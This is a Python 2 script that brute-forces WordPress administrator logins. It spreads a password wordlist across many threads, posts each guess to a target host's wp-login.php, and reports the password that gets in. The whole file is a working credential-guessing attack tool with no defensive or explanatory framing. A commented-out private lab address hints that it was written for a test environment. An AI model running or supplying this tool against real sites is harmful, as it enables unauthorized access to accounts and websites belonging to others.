#!/usr/bin/env python

from threading import Thread
from Queue import Queue
import requests
import itertools
import optparse
import re

import time
import signal
import sys

def check_pass(passwords, url, user, threadNum, timing, q, debug):
	user = "bob"
	regex = ur"<strong>ERROR</strong>"
	#url="http://10.10.1.29:8000/wp-login.php"
	global RUNNING
	RUNNING = True

	if(debug):
		print "Worker %d: trying %d passwords" % (threadNum, len(passwords))
	for i in range(len(passwords)):

		payload = {'log':user, 'pwd':passwords[i],'wp-submit':'Log In'}
		r = requests.post(url,data=payload)
		# FIXME check error codes from request.

		if re.search(regex,r.text) == None:
			if (debug):
				print "No match found, password worked! Tell the others!"

			print "Worker %d found a password: %s" % (threadNum, passwords[i])
			RUNNING = False
		else:
			# Match found. Password was wrong.
			if (debug):
				print "No match."
			pass

		if RUNNING == False:
			if (debug):
				print "Match was found! Lets shut this circus down!"
			return

		#time.sleep(1)
	if(debug):
		print "Worker %d done." % (threadNum)

def shutdown(signal, frame):
	print "Shutting down threads.."
	sys.exit(0)

def main(argv):
	THREADS = 20
	PASSWORDS = ""
	TIMING = 0

	# setup Queue
	q = Queue()

	# Setup signal handling
	signal.signal(signal.SIGINT, shutdown)

	# command line arguments
	parser = optparse.OptionParser()
	parser.add_option('-t', action="store", dest="threads", nargs=1, type=int, help="How many threads to spawn.")
	parser.add_option('-f', action="store", dest="password_file", nargs=1, help="Provided password file.")
	parser.add_option('-n', action="store", dest="seconds", nargs=1, type=int, help="Thread timing value.")
	parser.add_option('-u', action="store", dest="user", nargs=1, help="User name to login with (default: admin)")
	parser.add_option('-a', action="store", dest="host", nargs=1, help="Hostname of target")
	parser.add_option('-d', action="store_true", dest="debug", default=False, help="Display debuggin strings")
	(results, args) = parser.parse_args()

	if (results.password_file or results.host):
		if (results.debug):
			print "Using password file %s" % (results.password_file)
		PASSWORDS = results.password_file
	else:
		print "No password file.."
		sys.exit(-1)

	if (results.threads):
		THREADS = results.threads
	else:
		print "Using default 20 workers.."

	if (results.seconds):
		print "Pausing %d seconds between each login attempt." % (results.seconds)
		TIMING = results.seconds

	# how many lines are we dealing with?
	num_lines = sum(1 for line in open(PASSWORDS))
	print "Using password file %s with %d lines." % (PASSWORDS, num_lines)
	# double open? FIXME
	text_file = open(PASSWORDS,'r')
	# sane array
	lines = []

	# read in each line, strip new line, append to array.
	for index,text in enumerate(text_file):
		if 0 <= index <= num_lines:
			lines.append(text.strip("\n"))

	# some lambda magic that splits array into chunks
	chunks = lambda l, n: [l[x: x+n] for x in xrange(0,len(l), n)]
	# chunky!
	password_lines = chunks(lines, len(lines)/THREADS)
	print "Using average size of %d passwords/worker" % (len(password_lines[0]))

	attack_url = "http://%s/wp-login.php" % results.host
	if (results.debug):
		print attack_url

	# Fire off worker threads with each chunk.
	print "Starting %d Workers.. press Ctrl+C to stop." % (THREADS)
	for worker_number in range(len(password_lines)):
		# send to thread
		t = Thread(target=check_pass, args=(password_lines[worker_number], attack_url, "admin", worker_number,TIMING,q, results.debug))
		t.start()

if __name__ == "__main__":
	main(sys.argv)
